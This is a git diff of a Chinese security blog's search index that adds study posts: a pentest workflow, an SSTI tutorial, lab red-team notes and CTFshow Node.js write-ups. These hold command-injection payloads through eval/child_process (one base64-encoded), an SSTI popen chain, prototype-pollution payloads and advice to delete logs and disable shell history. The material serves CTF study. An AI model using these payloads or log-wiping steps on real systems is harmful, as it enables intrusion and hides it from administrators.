@@ -1,6 +1,147 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>渗透测试流程</title>
+    <url>/2025/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
+    <content><![CDATA[<p>渗透测试是什么？</p>
+<p>在授权许可下，对目标系统渗透，找出尽可能多的安全漏洞。</p>
+<h2 id="获得授权"><a href="#获得授权" class="headerlink" title="获得授权"></a>获得授权</h2><p>获得甲方的法律授权，规避不必要的法律风险。</p>
+<p>甲方会给出需要渗透的域名和 ip，或者是资产名和 ip&#x2F;域名对应的 excel。</p>
+<p>给的是域名，子域名可能要自己去找。</p>
+<p>问清楚子域名能不能渗透，能不能爆破（因为有时候给你的是正常运行的服务）。</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>为什么进行信息搜集？把资产想象为一台机器，它是由一系列不同的部件构成的整体，而大概率这个机器的大部分部件都是市面上已有的，而很多低版本的部件都存在着已知的漏洞。判断各个部件具体是哪家厂商生产的，什么时候生产的可以精确定位到“部件”的漏洞，才能实现突破。</p>
+<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>雁过拔毛，兽走留皮。凡有行动，必有痕迹。尽管网站管理者想掩盖自己用的各个技术，但使用技术必定会留下痕迹，我们通过收集留在现场的指纹（网站的 ico、前端敏感信息、http 响应头等），来判断网站所使用的技术框架、内容管理系统（CMS）等信息。常见的 CMS 有 WordPress 等。</p>
+<img src="/2025/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/QQ20250501-210305.png" class="" title="QQ20250501-210305">
+
+<blockquote>
+<p>常见指纹识别工具：</p>
+<p>wappalyzer</p>
+</blockquote>
+<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>我们通常用爆破的方式收集子域名。</p>
+<p>52pojie.cn 是一个主域名，那么给它加上常见前缀，例如 abc.52pojie.cn，去访问他看看有没有结果。</p>
+<blockquote>
+<p>常见子域名收集工具：</p>
+<p><a href="https://hunter.qianxin.com/">奇安信鹰图</a></p>
+<p>fofa </p>
+<p>360</p>
+</blockquote>
+<h3 id="主机扫描和端口扫描"><a href="#主机扫描和端口扫描" class="headerlink" title="主机扫描和端口扫描"></a>主机扫描和端口扫描</h3><p>nmap 是主机扫描和端口扫描中十分常见的工具，但是因为特别出名，实战中会转而用 ping 命令或者 arp-scan。</p>
+<p>主机扫描本质上就是利用 arp 协议、tcp 协议、udp 协议、icmp 协议探测有没有存活的端口。</p>
+<blockquote>
+<p>主机扫描命令举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>-n 在主机发现之后不进行端口扫描 <code>no port scan</code>只打印响应了主机嗅探的可用主机，这种扫描也被称为 ping 扫描。</p>
+<p>-sL 列表扫描，比-s 多了一步侦查，允许对目标网络进行轻量级的侦查，而不会引起太多注意。</p>
+<p>对攻击者来说，知道有多少主机处于活动状态， 比列表扫描提供的每个 IP 和主机名的列表更有价值。</p>
+<p>正常运维的系统管理员也会用到-sn 参数，因为这条命令可以很容易地用于看有多少个网络上可用的主机或监视服务器的可用性。它相比对广播地址进行 ping 请求更可靠，因为许多主机不会响应广播查询。</p>
+<p>-sn 这个参数默认会发送四项数据，第一是 ICMP 回旋请求，第二是对端口 443 的 TCPSYN 请求，第三是对端口 80 的 TCPACK。第四就是默认情况下的 ICMP 时间戳请求。当非特权用户执行这条命令时，他只会使用 connect 调用,发送 SYN 数据包到目标主机的 80 和 443 端口。当使用特权用户扫描本地网络，它使用的 ARP 请求，自然它不是刚才提到的发送的四项数据。为什么？因为 ARP 请求是数据链路层的数据包，就没有 TCP 和 ICMP 协议的事，自然不能发送那些数据包。这条命令和这条命令很相似：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>当然这指的是扫描本地网络。扫描本地时可以用–send-ip 让 nmap 发送 icmp 时间戳请求来确定主机的活动性。因为在网络中 ARP 请求不会被所有主机响应。</p>
+</blockquote>
+<blockquote>
+<p>端口扫描命令举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports</span><br></pre></td></tr></table></figure>
+
+<p>-sT 明确指定用 TCP 协议进行扫描。<br>默认值是-sS，他利用 TCP 的 SYN 的标志位，来探测目标主机上的开放端口。发送一个 SYN 包只建立 TCP 连接的第一步，如果收到了目标主机的 SYN 加 ACK 回复，则表示响应的端口是开放的，如果收到 RST 复位数据包，则表示该端口是关闭的。SYN 扫描常常用于快速扫描目标主机的端口状态，因为它能够快速探测开放和关闭的端口。<br>而-sT 是用三次握手过程来判断端口的状态，它通过发送完整的 TCP 连接请求，等待目标主机的回应。如果收到了 SYN+ACK 回复，则表示响应的端口是开放的。需要进行完整的 TCO 连接过程，因此相对较慢。<br>很多防火墙都能够检测到不完整的 TCP 连接。<br>-p 制定端口范围的参数，-是简化的制定 1-65535 端口。<br>-oA o 输出 A all 后面是具体指明文件位置。</p>
+</blockquote>
+<p><a href="https://www.bilibili.com/video/BV1dg411b74a/?vd_source=2a9c168f5a9a45998629d10835496e2c">红队笔记」主机发现和端口扫描的基本原理和工具选择</a></p>
+<p>如果指纹识别不到，那就要上手去自己测。如果没有已经存在的漏洞，没有识别出对应的指纹，那就要自己去目录扫描之类的挖掘漏洞。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当我们收集到了足够多的信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的 Web 漏洞，比如：弱口令、SQL 注入、命令执行、XSS、文件上传等。这一步既可以用自动化工具（如 sqlmap），也可以进行手动测试。接着尝试利用已验证的漏洞获取系统访问权限。</p>
+<p>漏洞 poc 库：<br><a href="https://github.com/Threekiii/Awesome-POC">https://github.com/Threekiii/Awesome-POC</a></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>内网渗透，从字面上理解便是对目标服务器所在内网进行渗透并最终获取域控权限的一种渗透。内网渗透的前提需要获取一个 shell，可以是低权限的 shell，因为可以通过提权获取高权限。</p>
+<p>在进行内网渗透之前需要了解一个概念，<strong>域环境</strong>。在内网中，往往可能存在几百上千台机器，例如需要对机器进行升级、打补丁、设置权限等，管理员不可能一台一台地更新修改。因此便衍生出了域环境。管理员以一台主机作为域控制器新建一个域，将所有其他主机加入域中，以域控来操作其他主机。因为域控的高权限，导致了域控所在的主机的管理员账号密码，可以登录任意一台主机，所以内网渗透的最终目标，往往便是拿下域控的权限。</p>
+<p>在渗透测试过程中，内网主机的端口是公网 IP 通过端口映射的。也就是说，我们连接的外网 IP 地址的端口，映射到内网中，不一定是那台服务器的端口。</p>
+<p>解决这种问题的方法有两种：<br>1、让目标机器去连接外网主机（必须有一台公网服务器，内网主机能够访问互联网）<br>2、在目标机器上设置一个信号站（放一个 WEB 文件在目标机器上，所有流量都经过这个文件通信）</p>
+<p>内网转发工具<br><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a><br><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<h2 id="权限提升与维持"><a href="#权限提升与维持" class="headerlink" title="权限提升与维持"></a>权限提升与维持</h2><p>在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。例如在网站里上传不死马，隐藏用户。</p>
+<h2 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h2><p>1：如果是 Linux 系统，在获取权限后，执行以下命令，不会记录输入过的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export HISTFILE=/dev/null export HISTSIZE=0</span><br><span class="line">AI 写代码</span><br></pre></td></tr></table></figure>
+
+<p>2：删除 &#x2F;var&#x2F;log 目录下的日志文件</p>
+<p>3：如果是 web 应用，找到 web 日志文件，删除 </p>
+<h2 id="撰写报告"><a href="#撰写报告" class="headerlink" title="撰写报告"></a>撰写报告</h2><p>输出详细报告，包含漏洞描述、风险等级、复现步骤及修复方案，以便于网站管理员根据我们的渗透测试报告修补漏洞。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1365962/202101/1365962-20210120143235482-1758727633.png" alt="img"></p>
+<p><strong>两篇系统性的讲述渗透测试的文章</strong></p>
+<p><a href="https://zhuanlan.zhihu.com/p/698306147">https://zhuanlan.zhihu.com/p/698306147</a></p>
+<p><a href="https://blog.csdn.net/wizardforcel/article/details/140816360">https://blog.csdn.net/wizardforcel/article/details/140816360</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>傻子都能看懂的SSTI入门</title>
+    <url>/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>by小林</p>
+<p><a href="https://xz.aliyun.com/news/3311#toc-1">https://xz.aliyun.com/news/3311#toc-1</a></p>
+<p><a href="https://xz.aliyun.com/t/9584#toc-32">https://xz.aliyun.com/t/9584#toc-32</a></p>
+<p><a href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p>
+<p>我常用的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;,&#x27;CTFer&lt;!--?name=CTFer&#x27;)</span><br><span class="line"></span><br><span class="line">    t = Template(&quot;hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=10008)</span><br><span class="line"></span><br><span class="line">#/?name=&#123;&#123;7*7&#125;&#125; 会发现页面返回了49，代表着存在反模板渲染</span><br><span class="line">#这里的渲染等同于在python中运算了print(7*7)</span><br><span class="line">#&#123;&#123;&#125;&#125;中的操作会被打印出来</span><br><span class="line"># 一般会用&#123;%%&#125;来替代，但是&#123;%%&#125;不会有回显,在没有数据时会报错</span><br><span class="line"># 可以用&#123;%print(7*7)%&#125;来进行输出</span><br><span class="line"># 你可以理解为，模板注入就是会对你传入的&#123;&#123;&#125;&#125;中的 “python代码” 进行执行 ，或者说是 解析你输入的表达式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#/?name=</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125; 会发现页面返回了49，代表着存在反模板渲染</span><br><span class="line"></span><br><span class="line">这里的渲染等同于在python中运算了print(7*7)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#125;&#125;中的操作会被打印出来</span><br><span class="line"></span><br><span class="line">一般会用`&#123;%%&#125;`来替代，但是`&#123;%%&#125;`不会有回显,在没有数据时会报错</span><br><span class="line"></span><br><span class="line">可以用&#123;%print(7*7)%&#125;来进行输出</span><br><span class="line"></span><br><span class="line">你可以理解为，模板注入就是会对你传入的&#123;&#123;&#125;&#125;中的 “python代码” 进行执行 ，或者说是 解析你输入的表达式</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>我们可以发现网络上大部分的payload都会利用”” ‘’ [] 来作为开头，我们来看看他在做什么</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763176430-7a0e4919-8fae-4e91-8c30-2b71e034296d.png"></p>
+<p>其实””，’’,[]，都是一个对象，我们可以通过一些魔术函数来获取他们的类原型</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763245034-f8626bda-1767-4759-99f3-fa7ff011ca2a.png"></p>
+<p>例如这里，我们就获取了字符串的类原型，我们的目的是获取基类Object，至于为什么需要获取他后需在说</p>
+<p>我们可以利用一些魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__base__ //返回类的父类</span><br><span class="line"></span><br><span class="line">__mro__//获取继承类的数组</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763383376-241875ea-bdf5-46e6-bd47-ecc8ba9433aa.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763451500-085ca8ef-e78b-43e2-a454-e8c43873764f.png"></p>
+<p>使用任意一个即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763437399-f63d5f90-e1fb-434c-85c0-924abbb92d75.png"></p>
+<p>好的我们获取到基类了，接下来我们可以列出来所有的类,使用一个魔术函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__base__.__subclasses__())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763550631-515f15d4-f612-4bb2-b0f1-fd8369f880a6.png"></p>
+<p>其中有一个类叫做 os._wrap_close，我们要去看看他其中的方法，这里返回的是一个数组，所以需要知道这个属性的下标是什么</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">classes=<span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">#把列表放在这</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">alllist=[]</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classes:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i==<span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result+=i</span><br><span class="line"><span class="comment">#寻找要找的类，并返回其索引</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(alllist):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;class &#x27;os._wrap_close&#x27;&gt;&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment"># &lt;class &#x27;os._wrap_close&#x27;&gt; 执行命令</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;  执行命令</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt; 读取文件</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; 读取文件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763910985-43fc7afd-f971-4560-8e90-3e8b4341aca9.png"></p>
+<p>在154,那么我们选用这个类，利用魔术函数__init__进行初始化，使用__globals__去获取他的变量属性及函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__base__.__subclasses__()[154].__init__.__globals__)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764008834-e6740d59-2400-4d7a-9b64-209921c36c32.png"></p>
+<p>popen是一个可以执行命令的函数 system.popen，他这里是一个元组的类型，我们选用该函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__base__.__subclasses__()[154].__init__.__globals__[&quot;popen&quot;])</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764069176-392b9ca3-2f57-4c69-a268-1e96d70818f5.png"></p>
+<p>然后我们使用该函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764103186-9d3f293c-7ab1-40c1-9750-cb6941a867ee.png"></p>
+<p>如果需要读取回显，在后面加一个read</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764153701-1d413b54-aed7-4f7f-9560-40584c5aca5a.png"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>红队笔记</title>
+    <url>/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="W1R3S-1-0-1"><a href="#W1R3S-1-0-1" class="headerlink" title="W1R3S 1.0.1"></a>W1R3S 1.0.1</h1><p><a href="https://www.bilibili.com/video/BV1mB4y1j7K6/?spm_id_from=333.1387.upload.video_card.click&vd_source=2a9c168f5a9a45998629d10835496e2c">「红队笔记」靶机精讲：W1R3S 1.0.1 - 渗透测试思路为王，细节多到即使对于纯萌新也能无感入圈。</a></p>
+<p>建议不一直用root身份登录，而是用普通身份，这样安全，要执行底层命令的再sudo。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>-n 在主机发现之后不进行端口扫描 <code>no port scan</code>只打印响应了主机嗅探的可用主机，这种扫描也被称为ping扫描。</p>
+<p>-sL 列表扫描，比-s多了一步侦查，允许对目标网络进行轻量级的侦查，而不会引起太多注意。</p>
+<p>对攻击者来说，知道有多少主机处于活动状态， 比列表扫描提供的每个IP和主机名的列表更有价值。</p>
+<p>正常运维的系统管理员也会用到-sn参数，因为这条命令可以很容易地用于看有多少个网络上可用的主机或监视服务器的可用性。它相比对广播地址进行ping请求更可靠，因为许多主机不会响应广播查询。</p>
+<p>-sn 这个参数默认会发送四项数据，第一是ICMP回旋请求，第二是对端口443的TCPSYN请求，第三是对端口80的TCPACK。第四就是默认情况下的ICMP时间戳请求。当非特权用户执行这条命令时，他只会使用connect调用,发送SYN数据包到目标主机的80和443端口。当使用特权用户扫描本地网络，它使用的ARP请求，自然它不是刚才提到的发送的四项数据。为什么？因为ARP请求是数据链路层的数据包，就没有TCP和ICMP协议的事，自然不能发送那些数据包。这条命令和这条命令很相似：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>当然这指的是扫描本地网络。扫描本地时可以用–send-ip让nmap发送icmp时间戳请求来确定主机的活动性。因为在网络中ARP请求不会被所有主机响应。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 10.10.10.21 -oA nmapscan/ports</span><br><span class="line">-sT 明确指定用TCP协议进行扫描。</span><br><span class="line">默认值是-sS，他利用TCP的SYN的标志位，来探测目标主机上的开放端口。发送一个SYN包只建立TCP连接的第一步，如果收到了目标主机的SYN加ACK回复，则表示响应的端口是开放的，如果收到RST复位数据包，则表示该端口是关闭的。SYN扫描常常用于快速扫描目标主机的端口状态，因为它能够快速探测开放和关闭的端口。</span><br><span class="line">而-sT是用三次握手过程来判断端口的状态，它通过发送完整的TCP连接请求，等待目标主机的回应。如果收到了SYN+ACK回复，则表示响应的端口是开放的。需要进行完整的TCO连接过程，因此相对较慢。</span><br><span class="line">很多防火墙都能够检测到不完整的TCP连接。</span><br><span class="line">-p 制定端口范围的参数，-是简化的制定1-65535端口。</span><br><span class="line">-oA o 输出 A all 后面是具体指明文件位置。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; |paste -sd &#x27;,&#x27;)</span><br><span class="line">先在nmapscan/ports.nmap文件里找出包含open的行，接着把这些行按照/分割，最后输出每行的第一个字段。</span><br><span class="line">适用于端口很多的情况。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>反序列化刷题心得</title>
     <url>/2025/04/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/</url>
     <content><![CDATA[]]></content>
@@ -40,9 +181,6 @@
 <img src="/2025/04/13/XXE%E4%BE%8B%E4%BC%9A%E4%BD%9C%E4%B8%9A/QQ20250413-210107.png" class="" title="QQ20250413-210107">
 
 <p>最后找字数多的看 flag。</p>
-<h1 id="在本地复现-XXE-盲注的部分（尝试理解原理后手动编写-Payload）。"><a href="#在本地复现-XXE-盲注的部分（尝试理解原理后手动编写-Payload）。" class="headerlink" title="在本地复现 XXE 盲注的部分（尝试理解原理后手动编写 Payload）。"></a>在本地复现 XXE 盲注的部分（尝试理解原理后手动编写 Payload）。</h1><ul>
-<li>思考：如果服务器被禁止从外部服务器访问 <code>info.dtd</code> 文件，如何进行盲注？附上你的  Payload。</li>
-</ul>
 ]]></content>
   </entry>
   <entry>
@@ -822,10 +960,62 @@
 
 
 
+<h2 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>附件给了源码 user.js login,js</p>
+<p>user.js 中有用户名：CTFSHOW，密码：123456 4、审计 login.js，其中代码 return name!&#x3D;&#x3D;’CTFSHOW’ &amp;&amp; item.username &#x3D;&#x3D;&#x3D; name.toUpperCase() &amp;&amp; item.password &#x3D;&#x3D;&#x3D; password;，用户名输入小写 ctfshow</p>
+<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>页面发现 eval 参数的 get 传参</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;tac fl00g.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码解释：</span><br><span class="line">require(&#x27;child_process&#x27;)：在 Node.js 里，child_process 是一个内置模块，require(&#x27;child_process&#x27;) 用于引入该模块，借助它可以创建子进程。</span><br><span class="line">spawnSync(&#x27;ls&#x27;, [&#x27;.&#x27;])：spawnSync 是 child_process 模块的同步方法，其作用是创建一个子进程并执行命令。这里执行的命令是 ls（在 Unix/Linux 系统下用于列出目录内容），参数是 .（表示当前目录）。</span><br><span class="line">.stdout.toString()：spawnSync 方法的返回值包含子进程的标准输出（stdout）等信息，stdout 是一个 Buffer 对象，toString() 方法把它转换为字符串。</span><br><span class="line">整体效果：当 Web 应用执行这个 eval() 代码时，会列出当前目录下的所有文件和文件夹。</span><br></pre></td></tr></table></figure>
+
+<p>跟 SSTI 是固定模版，require 类似于 import，所以背就完事了，</p>
+<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>把上一题的 execSync 过滤了</p>
+<p>过滤了exec，其他不变</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">child_process.spawnSync(command[, args][, options])</span><br><span class="line"></span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;, [&#x27;-l&#x27;, &#x27;.&#x27;]).stdout</span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;fl001g.txt&#x27;]).stdout</span><br></pre></td></tr></table></figure>
+
+<p>其中的stdout表示缓冲区中的内容，也就是输出结果，也可以在结尾继续追加一个toString()方法但是还可以用</p>
+<p>or:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查发现过滤了 exec</span><br><span class="line">可以将命令 base64 编码，然后解码后再次 eval</span><br><span class="line"></span><br><span class="line">/?eval=eval(Buffer.from(&quot;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp&quot;,&#x27;base64&#x27;).toString(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure>
+
+<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">	res.end(flag);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><code>?a[a]=1&amp;b[b]=1</code><br>满足a和b都为真、a和b长度相等、和字符串拼接的结果都是[object Object]flag</p>
+<h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给了源码, 看到 login.js 里面有个copy() 函数</span><br><span class="line"></span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">找到copy() 函数的用法</span><br><span class="line"></span><br><span class="line">function copy(object1, object2)&#123;</span><br><span class="line">    for (let key in object2) &#123;</span><br><span class="line">        if (key in object2 &amp;&amp; key in object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>基础的原型链污染, 因为需要 满足条件 <code>secert.ctfshow===&#39;36dboy&#39; </code>, 可以输出flag,<br>但是secert 是否有 ctfshow不重要, 让它的原型拥有就行,<br>secert 和 user 都是 对象, 在执行 copy 操作 ,构造一个请求体污染了user的原型,<br>存在一个 ctfshow的属性, 值为 36dboy , 那么在 secert 的里面找不到ctfshow的属性. 就会往原型上去找, 从而满足<code>secert.ctfshow===&#39;36dboy&#39;</code> ,得到flag<br>抓个登录的包, 修改一下就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#123;&quot;username&quot;:&quot;111&quot;,&quot;password&quot;:&quot;111&quot;,&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<h3 id="web339-变量覆盖query"><a href="#web339-变量覆盖query" class="headerlink" title="web339 变量覆盖query"></a>web339 变量覆盖query</h3><p>login.js</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span 